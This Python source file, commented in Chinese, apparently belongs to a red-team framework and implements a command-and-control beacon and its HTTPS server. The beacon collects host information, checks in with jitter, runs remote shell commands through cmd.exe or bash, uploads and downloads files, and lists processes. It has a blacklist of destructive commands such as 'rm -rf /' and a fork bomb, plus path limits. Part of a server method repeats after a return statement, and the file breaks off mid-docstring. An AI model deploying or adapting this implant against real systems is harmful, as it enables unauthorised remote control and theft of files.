#!/usr/bin/env python3
"""
Beacon 通信模块 - Beacon Communication Module

轻量级 Beacon 实现，支持多种隧道类型
仅用于授权渗透测试和安全研究

特性:
    - 心跳模式通信
    - 多隧道支持 (HTTP/DNS/WebSocket)
    - 加密通信
    - 任务执行
    - 自动重连
"""

import asyncio
import hashlib
import ipaddress
import json
import logging
import os
import platform
import secrets
import socket
import ssl
import subprocess
import tempfile
import threading
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from .base import BaseC2, BeaconInfo, C2Config, C2Status, Task, TaskResult, TaskTypes
from .crypto import C2Crypto
from .protocol import ProtocolCodec, decode_tasks, encode_heartbeat, encode_result
from .tunnels import BaseTunnel, create_tunnel

logger = logging.getLogger(__name__)


class BeaconMode(Enum):
    """Beacon 运行模式"""

    INTERACTIVE = "interactive"  # 交互模式（低延迟）
    SLEEP = "sleep"  # 睡眠模式（正常心跳）
    LOW = "low"  # 低频模式（长间隔）


@dataclass
class BeaconConfig(C2Config):
    """
    Beacon 配置

    继承 C2Config 并添加 Beacon 特定配置
    """

    # 端点配置（覆盖默认值）
    checkin_endpoint: str = "/api/checkin"
    task_endpoint: str = "/api/tasks"
    result_endpoint: str = "/api/results"

    # Beacon 特定配置
    initial_delay: float = 0.0  # 启动延迟
    kill_date: Optional[float] = None  # 自毁日期（时间戳）

    # 执行配置
    shell_timeout: int = 60  # Shell 命令超时
    max_output_size: int = 10000  # 最大输出大小

    # 命令安全配置
    command_validation: bool = True  # 是否启用命令验证
    command_blacklist: frozenset = field(
        default_factory=lambda: frozenset(
            {
                "rm -rf /",
                "rm -rf /*",
                "mkfs",
                "dd if=/dev/zero",
                ":(){ :|:& };:",
                "format c:",
                "> /dev/sda",
            }
        )
    )
    max_command_length: int = 4096  # 命令最大长度

    # 路径安全配置 — 限制文件操作的允许目录
    allowed_paths: List[str] = field(
        default_factory=lambda: [tempfile.gettempdir()]
    )

    def __post_init__(self):
        """初始化后处理"""
        super().__post_init__()

        # 同步端点配置
        self.checkin_path = self.checkin_endpoint
        self.task_path = self.task_endpoint
        self.result_path = self.result_endpoint


class Beacon(BaseC2):
    """
    轻量级 Beacon - 心跳模式通信

    通过可配置的隧道与 C2 服务器通信，支持任务获取和执行

    Usage:
        # 基本用法
        config = BeaconConfig(
            server="c2.example.com",
            port=443,
            protocol="https"
        )
        beacon = Beacon(config)

        # 注册任务处理器 (安全示例 - 使用subprocess而非os.popen)
        def safe_shell_handler(cmd: str) -> str:
            '''安全的shell命令处理器'''
            import subprocess
            import shlex
            try:
                # 使用列表形式调用，避免shell注入
                result = subprocess.run(
                    cmd if isinstance(cmd, list) else ['sh', '-c', cmd],
                    capture_output=True,
                    text=True,
                    timeout=60
                )
                return result.stdout[:10000]  # 限制输出大小
            except subprocess.TimeoutExpired:
                return "[Error] Command timeout"
            except Exception as e:
                return f"[Error] {e}"

        beacon.register_handler('shell', safe_shell_handler)

        # 启动 Beacon
        beacon.start()

        # 停止
        beacon.stop()
    """

    def __init__(self, config: BeaconConfig):
        """
        初始化 Beacon

        Args:
            config: Beacon 配置
        """
        super().__init__(config)

        self.config: BeaconConfig = config
        self.beacon_id = self._generate_beacon_id()

        # 隧道
        self._tunnel: Optional[BaseTunnel] = None

        # 运行状态
        self._running = False
        self._starting = False  # 新增：标记是否正在启动中
        self._thread: Optional[threading.Thread] = None
        self._state_lock = threading.Lock()
        self._startup_lock = threading.Lock()  # 新增：启动锁，防止并发启动
        self._stop_event = threading.Event()
        self._mode = BeaconMode.SLEEP

        # 编解码器
        self._codec = ProtocolCodec(compress=True)
        self._crypto: Optional[C2Crypto] = None

        # 初始化加密
        if config.encryption != "none" and config.key:
            self._crypto = C2Crypto(config.encryption, config.key)
            self._codec = ProtocolCodec(crypto=self._crypto, compress=True)

        # 系统信息
        self._info = self._collect_system_info()

        # 注册默认处理器
        self._register_default_handlers()

    def _generate_beacon_id(self) -> str:
        """生成唯一 Beacon ID — 密码学安全随机"""
        import secrets

        return secrets.token_hex(8)

    def _collect_system_info(self) -> BeaconInfo:
        """收集系统信息"""
        hostname = socket.gethostname()
        username = os.getenv("USERNAME", os.getenv("USER", "unknown"))
        os_info = f"{platform.system()} {platform.release()}"
        arch = platform.machine()
        pid = os.getpid()

        # 获取本地 IP
        ip_address = "127.0.0.1"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
        except (OSError, socket.error) as e:
            logger.debug("Failed to get local IP: %s", e)

        # 检测完整性级别
        integrity = "medium"
        if platform.system() == "Windows":
            try:
                import ctypes

                if ctypes.windll.shell32.IsUserAnAdmin():
                    integrity = "high"
            except (ImportError, AttributeError, OSError) as e:
                logger.debug("Failed to check admin status: %s", e)

        elif os.geteuid() == 0:
            integrity = "high"

        return BeaconInfo(
            beacon_id=self.beacon_id,
            hostname=hostname,
            username=username,
            os_info=os_info,
            arch=arch,
            ip_address=ip_address,
            pid=pid,
            integrity=integrity,
            sleep_time=self.config.interval,
        )

    def _register_default_handlers(self) -> None:
        """注册默认任务处理器"""
        self.register_handler(TaskTypes.SHELL, self._handle_shell)
        self.register_handler(TaskTypes.SLEEP, self._handle_sleep)
        self.register_handler(TaskTypes.EXIT, self._handle_exit)
        self.register_handler(TaskTypes.CHECKIN, self._handle_checkin)
        self.register_handler(TaskTypes.PWD, self._handle_pwd)
        self.register_handler(TaskTypes.CD, self._handle_cd)
        self.register_handler(TaskTypes.LS, self._handle_ls)
        self.register_handler(TaskTypes.CAT, self._handle_cat)
        self.register_handler(TaskTypes.PS, self._handle_ps)
        self.register_handler(TaskTypes.UPLOAD, self._handle_upload)
        self.register_handler(TaskTypes.DOWNLOAD, self._handle_download)

    # ==================== 连接管理 ====================

    def connect(self) -> bool:
        """
        建立连接

        Returns:
            是否成功
        """
        self._set_status(C2Status.CONNECTING)

        try:
            # 创建隧道
            self._tunnel = create_tunnel(
                protocol=self.config.protocol,
                server=self.config.server,
                port=self.config.port,
                config=self.config,
            )

            # 连接隧道
            if self._tunnel.connect():
                self._set_status(C2Status.CONNECTED)

                # 发送签到
                self._checkin()

                logger.info("Beacon connected: %s", self.beacon_id)
                return True

            self._set_status(C2Status.ERROR)
            return False

        except (ConnectionError, TimeoutError, OSError) as e:
            logger.error("Beacon connect error: %s", e)
            self._set_status(C2Status.ERROR)
            return False
        except ValueError as e:
            logger.error("Beacon config error: %s", e)
            self._set_status(C2Status.ERROR)
            return False

    def disconnect(self) -> None:
        """断开连接"""
        if self._tunnel:
            try:
                self._tunnel.disconnect()
            except (ConnectionError, OSError) as e:
                logger.warning("Error during disconnect: %s", e)

            self._tunnel = None

        self._set_status(C2Status.DISCONNECTED)
        logger.info("Beacon disconnected")

    def reconnect(self) -> bool:
        """重新连接"""
        self._set_status(C2Status.RECONNECTING)
        self.disconnect()

        for attempt in range(self.config.max_retries):
            delay = self.config.retry_delay * (2**attempt)
            logger.info(
                f"Reconnecting in {delay:.1f}s (attempt {attempt + 1}/{self.config.max_retries})"
            )
            # 使用 _stop_event.wait 支持中断
            if self._stop_event.wait(delay):
                return False  # 被中断

            if self.connect():
                return True

        return False

    # ==================== 数据收发 ====================

    def send(self, data: bytes) -> bool:
        """
        发送数据

        Args:
            data: 要发送的数据

        Returns:
            是否成功
        """
        if not self._tunnel:
            return False

        return self._tunnel.send(data)

    def receive(self) -> Optional[bytes]:
        """
        接收数据

        Returns:
            接收到的数据
        """
        if not self._tunnel:
            return None

        return self._tunnel.receive(timeout=self.config.timeout)

    # ==================== Beacon 循环 ====================

    def _set_running(self, value: bool) -> None:
        """设置运行状态（线程安全）"""
        with self._state_lock:
            self._running = value
            if value:
                self._stop_event.clear()
            else:
                self._stop_event.set()

    def _is_running(self) -> bool:
        """
        检查是否正在运行（线程安全）

        Returns:
            True 如果 Beacon 正在运行或正在启动中

        Note:
            此方法在锁内原子地检查所有状态，避免 TOCTOU 问题
        """
        with self._state_lock:
            # 正在启动中也算运行
            if self._starting:
                return True
            if not self._running:
                return False
            # 缓存线程引用并在锁内检查
            thread = self._thread
            if thread is None:
                return False
            # 在锁内检查线程状态
            return thread.is_alive()

    def _request_stop(self) -> None:
        """请求停止（线程安全）"""
        self._set_running(False)

    def start(self) -> None:
        """
        启动 Beacon 循环

        使用双重锁机制防止并发启动竞态条件：
        1. _startup_lock: 确保只有一个线程能执行启动流程
        2. _state_lock: 保护状态变量的读写
        """
        # 使用非阻塞方式获取启动锁，防止多个线程同时启动
        if not self._startup_lock.acquire(blocking=False):
            logger.debug("Beacon startup already in progress")
            return

        try:
            with self._state_lock:
                # 检查是否已经在运行
                if self._running and self._thread and self._thread.is_alive():
                    logger.debug("Beacon already running")
                    return

                # 检查自毁日期
                if self.config.kill_date and time.time() > self.config.kill_date:
                    logger.warning("Kill date reached, not starting")
                    return

                # 标记为正在启动
                self._starting = True
                self._running = True
                self._stop_event.clear()

            # 启动延迟（在锁外执行，避免阻塞其他操作）
            if self.config.initial_delay > 0:
                # 使用 _stop_event.wait 代替 time.sleep，支持中断
                if self._stop_event.wait(self.config.initial_delay):
                    logger.info("Beacon startup cancelled during delay")
                    self._cleanup_startup()
                    return

            # 连接（在锁外执行）
            if not self.connect():
                logger.error("Failed to connect, not starting beacon loop")
                self._cleanup_startup()
                return

            # 创建并启动线程（在锁内）
            with self._state_lock:
                # 再次检查，可能在连接期间被停止
                if not self._running:
                    logger.info("Beacon stopped during startup")
                    return

                self._thread = threading.Thread(
                    target=self._beacon_loop, daemon=True, name=f"Beacon-{self.beacon_id[:8]}"
                )
                self._thread.start()
                self._starting = False  # 启动完成

            logger.info("Beacon started: %s", self.beacon_id)

        finally:
            self._startup_lock.release()

    def _cleanup_startup(self) -> None:
        """清理失败的启动状态"""
        with self._state_lock:
            self._running = False
            self._starting = False
            self._stop_event.set()

    def stop(self) -> None:
        """
        停止 Beacon（线程安全）

        处理多种状态：
        1. 正在启动中 (_starting=True) - 通过stop_event中断
        2. 正在运行 (_running=True) - 正常停止
        3. 已停止 - 无操作
        """
        # 首先设置停止标志，中断任何等待操作
        with self._state_lock:
            was_starting = self._starting
            was_running = self._running
            self._running = False
            self._starting = False
            self._stop_event.set()
            thread = self._thread
            self._thread = None

        # 如果正在启动中，等待启动锁释放
        if was_starting:
            # 尝试获取启动锁以确保启动流程已结束
            acquired = self._startup_lock.acquire(timeout=2.0)
            if acquired:
                self._startup_lock.release()
            else:
                logger.warning("Timeout waiting for startup to complete")

        # 等待线程结束（在锁外）
        if thread and thread is not threading.current_thread():
            thread.join(timeout=5.0)
            if thread.is_alive():
                logger.warning("Beacon thread did not stop gracefully")

        # 断开连接
        self.disconnect()

        if was_running or was_starting:
            logger.info("Beacon stopped")

    def run(self) -> None:
        """同步运行 Beacon（阻塞）"""
        self.start()

        try:
            while not self._stop_event.is_set():
                self._stop_event.wait(1.0)
        except KeyboardInterrupt:
            pass
        finally:
            self.stop()

    def run_async(self) -> Optional[threading.Thread]:
        """
        异步运行 Beacon

        Returns:
            启动成功返回线程对象，失败返回 None
        """
        self.start()
        with self._state_lock:
            # 确保线程已成功创建并运行
            if self._thread and self._thread.is_alive():
                return self._thread
            return None

    def _beacon_loop(self) -> None:
        """Beacon 主循环"""
        try:
            while not self._stop_event.is_set():
                try:
                    # 检查自毁日期
                    if self.config.kill_date and time.time() > self.config.kill_date:
                        logger.warning("Kill date reached, stopping")
                        self._request_stop()
                        break

                    # 发送心跳
                    self._send_heartbeat()

                    # 获取任务
                    tasks = self._check_tasks()

                    # 执行任务
                    for task in tasks:
                        if self._stop_event.is_set():
                            break

                        result = self.process_task(task)
                        self._send_result(result)

                        # 如果是退出任务，停止循环
                        if task.type == TaskTypes.EXIT:
                            self._request_stop()
                            break

                except (ConnectionError, TimeoutError, OSError) as e:
                    logger.error("Beacon loop network error: %s", e)

                    # 尝试重连
                    if not self._stop_event.is_set() and self.status == C2Status.CONNECTED:
                        if not self.reconnect():
                            logger.error("Reconnect failed, stopping")
                            self._request_stop()
                            break
                except (ValueError, KeyError) as e:
                    logger.error("Beacon loop data error: %s", e)
                    # 数据错误不需要重连，继续下一轮

                # 计算睡眠时间
                if not self._stop_event.is_set():
                    sleep_time = self._calculate_sleep()
                    if self._stop_event.wait(sleep_time):
                        break
        finally:
            self._request_stop()

        logger.info("Beacon loop ended")

    def _calculate_sleep(self) -> float:
        """计算带抖动的睡眠时间"""
        import secrets

        base = self.config.interval
        jitter = base * self.config.jitter

        # 使用 secrets 模块生成随机抖动（范围 -jitter 到 +jitter）
        # secrets.randbelow 返回 [0, n)，转换为 [-jitter, +jitter]
        if jitter > 0:
            # 生成 0 到 2*jitter 范围的随机数，然后减去 jitter
            random_offset = (secrets.randbelow(int(jitter * 2000)) / 1000.0) - jitter
            return base + random_offset
        return base

    # ==================== 通信方法 ====================

    def _checkin(self) -> bool:
        """发送签到"""
        try:
            data = self._codec.encode_checkin(self._info)
            return self.send(data)
        except (ConnectionError, TimeoutError, OSError) as e:
            logger.error("Checkin network error: %s", e)
            return False
        except (ValueError, KeyError) as e:
            logger.error("Checkin encode error: %s", e)
            return False

    def _send_heartbeat(self) -> None:
        """发送心跳"""
        try:
            data = encode_heartbeat(self.beacon_id)
            self.send(data)
        except (ConnectionError, TimeoutError, OSError) as e:
            logger.debug("Heartbeat network error: %s", e)
        except (ValueError, KeyError) as e:
            logger.debug("Heartbeat encode error: %s", e)

    def _check_tasks(self) -> List[Task]:
        """获取待执行任务"""
        try:
            response = self.receive()
            if response:
                return decode_tasks(response)
        except (ConnectionError, TimeoutError, OSError) as e:
            logger.debug("Check tasks network error: %s", e)
        except (ValueError, KeyError) as e:
            logger.debug("Check tasks decode error: %s", e)

        return []

    def _send_result(self, result: TaskResult) -> bool:
        """发送任务结果"""
        try:
            data = encode_result(result)
            return self.send(data)
        except (ConnectionError, TimeoutError, OSError) as e:
            logger.error("Send result network error: %s", e)
            return False
        except (ValueError, KeyError) as e:
            logger.error("Send result encode error: %s", e)
            return False

    # ==================== 任务处理器 ====================

    def _handle_shell(self, command: str) -> str:
        """执行 Shell 命令"""
        # 命令验证
        if self.config.command_validation:
            if len(command) > self.config.max_command_length:
                logger.warning(
                    "命令超过长度限制: %d > %d",
                    len(command),
                    self.config.max_command_length,
                )
                return (
                    f"[Error] Command too long"
                    f" ({len(command)} > {self.config.max_command_length})"
                )

            cmd_lower = command.lower().strip()
            for blocked in self.config.command_blacklist:
                if blocked in cmd_lower:
                    logger.warning("命令匹配黑名单规则: %s", blocked)
                    return "[Error] Command blocked by security policy"

        logger.info("Beacon 执行命令: %s", command[:100])  # 只记录前100字符

        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["cmd.exe", "/c", command],
                    capture_output=True,
                    text=True,
                    timeout=self.config.shell_timeout,
                )
            else:
                result = subprocess.run(
                    ["/bin/bash", "-c", command],
                    capture_output=True,
                    text=True,
                    timeout=self.config.shell_timeout,
                )

            output = result.stdout
            if result.stderr:
                output += f"\n[STDERR]\n{result.stderr}"

            # 限制输出大小
            return output[: self.config.max_output_size]

        except subprocess.TimeoutExpired:
            return "[Error] Command timed out"
        except (OSError, subprocess.SubprocessError) as e:
            return f"[Error] Execution failed: {e}"

    def _handle_sleep(self, payload: Any) -> str:
        """修改睡眠时间"""
        try:
            if isinstance(payload, dict):
                interval = payload.get("interval", payload.get("time"))
                jitter = payload.get("jitter")
            else:
                interval = int(payload)
                jitter = None

            if interval:
                self.config.interval = float(interval)

            if jitter is not None:
                self.config.jitter = float(jitter)

            return f"Sleep time set to {self.config.interval}s (jitter: {self.config.jitter})"

        except (ValueError, TypeError) as e:
            return f"[Error] Invalid sleep config: {e}"

    def _handle_exit(self, payload: Any) -> str:
        """退出 Beacon"""
        self._request_stop()
        return "Exiting..."

    def _handle_checkin(self, payload: Any) -> Dict[str, Any]:
        """返回系统信息"""
        return self._info.to_dict()

    def _handle_pwd(self, payload: Any) -> str:
        """返回当前目录"""
        return os.getcwd()

    def _validate_path(self, path: str) -> Tuple[bool, str]:
        """验证路径是否在允许的目录范围内

        防止被恶意 C2 服务器利用进行任意文件读写。

        Args:
            path: 待验证的文件/目录路径

        Returns:
            (True, 解析后的绝对路径) 或 (False, 错误信息)
        """
        from pathlib import Path as _Path

        try:
            resolved = _Path(path).resolve()
        except (OSError, ValueError, RuntimeError) as e:
            return False, f"路径解析失败: {e}"

        for allowed in self.config.allowed_paths:
            try:
                allowed_resolved = _Path(allowed).resolve()
                resolved.relative_to(allowed_resolved)
                return True, str(resolved)
            except (ValueError, OSError, RuntimeError):
                continue

        return False, (
            f"路径 {resolved} 不在允许范围内 "
            f"(allowed_paths={self.config.allowed_paths})"
        )

    def _handle_cd(self, path: str) -> str:
        """切换目录"""
        valid, msg = self._validate_path(path)
        if not valid:
            logger.warning("cd 路径验证失败: %s", msg)
            return f"[Error] Path denied: {msg}"
        try:
            os.chdir(msg)  # msg 是解析后的绝对路径
            return os.getcwd()
        except (OSError, FileNotFoundError, PermissionError) as e:
            return f"[Error] Cannot change directory: {e}"

    def _handle_ls(self, path: Optional[str] = None) -> str:
        """列出目录内容"""
        try:
            target = path or os.getcwd()
            entries = []

            for entry in os.listdir(target):
                full_path = os.path.join(target, entry)
                try:
                    stat = os.stat(full_path)
                    is_dir = "d" if os.path.isdir(full_path) else "-"
                    size = stat.st_size
                    entries.append(f"{is_dir} {size:>10} {entry}")
                except (OSError, PermissionError):
                    entries.append(f"? {'?':>10} {entry}")

            return "\n".join(entries)

        except (OSError, FileNotFoundError, PermissionError) as e:
            return f"[Error] Cannot list directory: {e}"

    def _handle_cat(self, path: str) -> str:
        """读取文件内容"""
        valid, msg = self._validate_path(path)
        if not valid:
            logger.warning("cat 路径验证失败: %s", msg)
            return f"[Error] Path denied: {msg}"
        try:
            with open(msg, "r", encoding="utf-8", errors="replace") as f:
                content = f.read()
            return content[: self.config.max_output_size]
        except (OSError, FileNotFoundError, PermissionError) as e:
            return f"[Error] Cannot read file: {e}"

    def _handle_ps(self, payload: Any) -> str:
        """列出进程"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run(["tasklist"], capture_output=True, text=True, timeout=30)
            else:
                result = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=30)
            return result.stdout[: self.config.max_output_size]
        except subprocess.TimeoutExpired:
            return "[Error] Process list timed out"
        except (OSError, subprocess.SubprocessError) as e:
            return f"[Error] Cannot list processes: {e}"

    def _handle_upload(self, payload: Dict[str, Any]) -> str:
        """上传文件到目标"""
        try:
            import base64

            path = payload.get("path")
            content_b64 = payload.get("content")

            if not path or not content_b64:
                return "[Error] Missing path or content"

            valid, msg = self._validate_path(path)
            if not valid:
                logger.warning("upload 路径验证失败: %s", msg)
                return f"[Error] Path denied: {msg}"

            content = base64.b64decode(content_b64)
            with open(msg, "wb") as f:
                f.write(content)

            return f"Uploaded {len(content)} bytes to {msg}"

        except (OSError, PermissionError) as e:
            return f"[Error] Cannot write file: {e}"
        except (ValueError, TypeError) as e:
            return f"[Error] Invalid upload data: {e}"

    def _handle_download(self, path: str) -> Dict[str, Any]:
        """从目标下载文件"""
        valid, msg = self._validate_path(path)
        if not valid:
            logger.warning("download 路径验证失败: %s", msg)
            return {"error": f"Path denied: {msg}"}
        try:
            import base64

            with open(msg, "rb") as f:
                content = f.read()

            return {
                "path": msg,
                "content": base64.b64encode(content).decode(),
                "size": len(content),
            }

        except (OSError, FileNotFoundError, PermissionError) as e:
            return {"error": f"Cannot read file: {e}"}


# ==================== Beacon 会话 ====================


@dataclass
class BeaconSession:
    """
    Beacon 会话 — 跟踪单个 beacon 的完整生命周期

    支持 beacon 断开后保持会话，重连时自动恢复未完成任务
    """

    beacon_id: str
    info: BeaconInfo
    connected: bool = True
    task_queue: List[Task] = field(default_factory=list)
    results: List[TaskResult] = field(default_factory=list)
    disconnect_time: Optional[float] = None
    reconnect_count: int = 0

    def enqueue_task(self, task: Task) -> None:
        """入队任务"""
        self.task_queue.append(task)

    def get_pending_tasks(self) -> List[Task]:
        """获取并标记待发送任务"""
        pending = [t for t in self.task_queue if t.priority >= 0]
        for t in pending:
            t.priority = -1
        return pending

    def add_result(self, result: TaskResult) -> None:
        """添加任务结果"""
        self.results.append(result)

    def mark_disconnected(self) -> None:
        """标记断开 — 保留会话等待重连"""
        self.connected = False
        self.disconnect_time = time.time()
        # 重置未发送任务的 priority，重连后可重新下发
        for t in self.task_queue:
            if t.priority == -1:
                pass  # 已发送的不回退
            # priority >= 0 的保持原样，重连后继续下发

    def mark_reconnected(self) -> None:
        """标记重连"""
        self.connected = True
        self.disconnect_time = None
        self.reconnect_count += 1
        self.info.last_seen = time.time()


# ==================== Beacon 服务器 ====================


class BeaconServer:
    """
    Beacon 服务器 (C2 Server) - 生产级版本

    基于 asyncio + aiohttp 的 HTTPS C2 服务器，支持:
    - TLS 加密（自签名证书自动生成）
    - Operator API Key 认证
    - 多 beacon 会话管理（断开后保持，重连恢复）
    - 每 beacon 独立任务队列
    - 后台清理过期 beacon

    Usage:
        server = BeaconServer(host="0.0.0.0", port=8443, api_keys=["my-secret-key"])
        asyncio.run(server.run())  # 或 server.run_async()
    """

    # 默认配置：防止内存泄漏
    DEFAULT_MAX_BEACONS = 1000  # 最大 Beacon 数量
    DEFAULT_MAX_RESULTS_PER_BEACON = 100  # 每个 Beacon 最大结果数
    DEFAULT_BEACON_TIMEOUT = 3600  # Beacon 超时时间（秒）
    DEFAULT_CLEANUP_INTERVAL = 300  # 清理间隔（秒）

    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 8443,
        max_beacons: int = DEFAULT_MAX_BEACONS,
        max_results_per_beacon: int = DEFAULT_MAX_RESULTS_PER_BEACON,
        beacon_timeout: float = DEFAULT_BEACON_TIMEOUT,
        # TLS 配置
        tls_cert: Optional[str] = None,
        tls_key: Optional[str] = None,
        tls_enabled: bool = True,
        # 认证配置
        api_keys: Optional[List[str]] = None,
    ):
        """
        初始化服务器

        Args:
            host: 监听地址
            port: 监听端口
            max_beacons: 最大 Beacon 数量（防止内存泄漏）
            max_results_per_beacon: 每个 Beacon 最大结果数
            beacon_timeout: Beacon 超时时间（秒），超时后自动清理
            tls_cert: TLS 证书路径（None = 自动生成自签名）
            tls_key: TLS 私钥路径（None = 自动生成自签名）
            tls_enabled: 是否启用 TLS（默认 True）
            api_keys: 允许的 API Key 列表（None = 不要求认证）
        """
        self.host = host
        self.port = port
        self.max_beacons = max_beacons
        self.max_results_per_beacon = max_results_per_beacon
        self.beacon_timeout = beacon_timeout

        # TLS 配置
        self._tls_cert = tls_cert
        self._tls_key = tls_key
        self._tls_enabled = tls_enabled

        # Operator 认证
        self._api_keys: Optional[set] = set(api_keys) if api_keys else None

        # 会话存储（替代原始的 beacons/tasks/results 分离存储）
        self._sessions: Dict[str, BeaconSession] = {}
        self._sessions_lock = asyncio.Lock() if False else threading.Lock()

        # 向后兼容的视图
        self.beacons: Dict[str, BeaconInfo] = {}
        self.tasks: Dict[str, List[Task]] = {}  # beacon_id -> tasks
        self.results: Dict[str, List[TaskResult]] = {}  # beacon_id -> results

        # 线程锁（保持向后兼容）
        self._beacons_lock = threading.Lock()
        self._tasks_lock = threading.Lock()
        self._results_lock = threading.Lock()

        self._app = None
        self._running = False
        self._cleanup_thread: Optional[threading.Thread] = None
        self._async_runner: Optional[threading.Thread] = None
        self._loop: Optional[asyncio.AbstractEventLoop] = None
        self._site: Optional[Any] = None

    # ==================== TLS ====================

    def _generate_self_signed_cert(self) -> tuple:
        """
        生成自签名 TLS 证书（如果未提供外部证书）

        Returns:
            (cert_path, key_path) 临时文件路径
        """
        try:
            from cryptography import x509
            from cryptography.hazmat.primitives import hashes, serialization
            from cryptography.hazmat.primitives.asymmetric import rsa
            from cryptography.x509.oid import NameOID
            import datetime

            # 生成 RSA 私钥
            key = rsa.generate_private_key(public_exponent=65537, key_size=2048)

            # 生成自签名证书
            subject = issuer = x509.Name([
                x509.NameAttribute(NameOID.COMMON_NAME, "AutoRedTeam C2"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "AutoRedTeam"),
            ])

            cert = (
                x509.CertificateBuilder()
                .subject_name(subject)
                .issuer_name(issuer)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(datetime.datetime.utcnow())
                .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
                .add_extension(
                    x509.SubjectAlternativeName([
                        x509.DNSName("localhost"),
                        x509.IPAddress(ipaddress.IPv4Address("127.0.0.1")),
                    ]),
                    critical=False,
                )
                .sign(key, hashes.SHA256())
            )

            # 写入临时文件
            cert_dir = tempfile.mkdtemp(prefix="art_c2_")
            cert_path = os.path.join(cert_dir, "server.crt")
            key_path = os.path.join(cert_dir, "server.key")

            with open(cert_path, "wb") as f:
                f.write(cert.public_bytes(serialization.Encoding.PEM))

            with open(key_path, "wb") as f:
                f.write(key.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.TraditionalOpenSSL,
                    serialization.NoEncryption(),
                ))

            logger.info("自签名证书已生成: %s", cert_path)
            return cert_path, key_path

        except ImportError:
            logger.warning("cryptography 库未安装，使用 openssl 命令行生成证书")
            return self._generate_cert_openssl()

    def _generate_cert_openssl(self) -> tuple:
        """使用 openssl 命令行生成自签名证书"""
        import shutil

        if not shutil.which("openssl"):
            raise RuntimeError(
                "无法生成 TLS 证书: cryptography 库未安装且 openssl 不在 PATH 中"
            )

        cert_dir = tempfile.mkdtemp(prefix="art_c2_")
        cert_path = os.path.join(cert_dir, "server.crt")
        key_path = os.path.join(cert_dir, "server.key")

        subprocess.run(
            [
                "openssl", "req", "-x509", "-newkey", "rsa:2048",
                "-keyout", key_path, "-out", cert_path,
                "-days", "365", "-nodes",
                "-subj", "/CN=AutoRedTeam C2/O=AutoRedTeam",
            ],
            check=True,
            capture_output=True,
        )

        logger.info("自签名证书已通过 openssl 生成: %s", cert_path)
        return cert_path, key_path

    def _create_ssl_context(self) -> Optional[ssl.SSLContext]:
        """创建 SSL 上下文"""
        if not self._tls_enabled:
            return None

        cert_path = self._tls_cert
        key_path = self._tls_key

        # 如果没有提供证书，自动生成
        if not cert_path or not key_path:
            cert_path, key_path = self._generate_self_signed_cert()

        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_path, key_path)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        logger.info("TLS 已启用 (最低版本: TLSv1.2)")
        return ctx

    # ==================== 认证 ====================

    def _verify_api_key(self, request_headers: dict) -> bool:
        """
        验证 operator API Key

        Args:
            request_headers: HTTP 请求头 (dict-like)

        Returns:
            认证是否通过
        """
        if self._api_keys is None:
            return True  # 未配置 API Key = 不要求认证

        api_key = request_headers.get("X-API-Key") or request_headers.get("x-api-key")
        if not api_key:
            return False

        return api_key in self._api_keys

    # ==================== 会话管理 ====================

    def get_session(self, beacon_id: str) -> Optional[BeaconSession]:
        """获取 beacon 会话"""
        with self._beacons_lock:
            return self._sessions.get(beacon_id)

    def get_all_sessions(self) -> Dict[str, BeaconSession]:
        """获取所有会话的快照"""
        with self._beacons_lock:
            return dict(self._sessions)

    def send_task(self, beacon_id: str, task_type: str, payload: Any,
                  timeout: float = 300.0) -> Optional[str]:
        """
        向指定 beacon 下发任务

        Args:
            beacon_id: Beacon ID
            task_type: 任务类型
            payload: 任务载荷
            timeout: 超时时间

        Returns:
            任务 ID，如果 beacon 不存在则返回 None
        """
        with self._beacons_lock:
            session = self._sessions.get(beacon_id)
            if not session:
                logger.warning("Beacon 不存在: %s", beacon_id)
                return None

            task = Task.create(task_type, payload, timeout)
            session.enqueue_task(task)

        # 同步向后兼容视图
        self.add_task(beacon_id, task_type, payload, timeout)
        logger.info("任务已下发到 %s: %s (type=%s)", beacon_id, task.id, task_type)
        return task.id
        self._async_runner: Optional[threading.Thread] = None
        self._loop: Optional[asyncio.AbstractEventLoop] = None
        self._site: Optional[Any] = None

    def _cleanup_stale_beacons(self) -> int:
        """
        清理过期的 Beacon（线程安全）

        断开但未超时的 beacon 保留会话（等待重连）
        超时后才真正清理

        Returns:
            清理的 Beacon 数量
        """
        now = time.time()
        stale_ids = []

        with self._beacons_lock:
            for beacon_id, session in self._sessions.items():
                last_active = session.info.last_seen
                if session.disconnect_time:
                    last_active = session.disconnect_time
                if now - last_active > self.beacon_timeout:
                    stale_ids.append(beacon_id)

            for beacon_id in stale_ids:
                del self._sessions[beacon_id]

            # 同步向后兼容
            for beacon_id in stale_ids:
                self.beacons.pop(beacon_id, None)

        # 清理相关的 tasks 和 results
        if stale_ids:
            with self._tasks_lock:
                for beacon_id in stale_ids:
                    self.tasks.pop(beacon_id, None)

            with self._results_lock:
                for beacon_id in stale_ids:
                    self.results.pop(beacon_id, None)

            logger.info("清理了 %s 个过期 Beacon", len(stale_ids))

        return len(stale_ids)

    def _trim_results(self, beacon_id: str) -> None:
        """
        修剪结果列表，保持在限制内（需要在锁内调用）

        Args:
            beacon_id: Beacon ID
        """
        # 注意：调用者必须持有 _results_lock
        if beacon_id in self.results:
            results_list = self.results[beacon_id]
            if len(results_list) > self.max_results_per_beacon:
                # 保留最新的结果
                self.results[beacon_id] = results_list[-self.max_results_per_beacon :]

    def _cleanup_loop(self) -> None:
        """后台清理循环"""
        while self._running:
            time.sleep(self.DEFAULT_CLEANUP_INTERVAL)
            if self._running:
                try:
                    self._cleanup_stale_beacons()
                except Exception as e:
                    logger.error("清理 Beacon 失败: %s", e)

    def add_task(self, beacon_id: str, task_type: str, payload: Any, timeout: float = 300.0) -> str:
        """
        添加任务（线程安全）

        Args:
            beacon_id: Beacon ID
            task_type: 任务类型
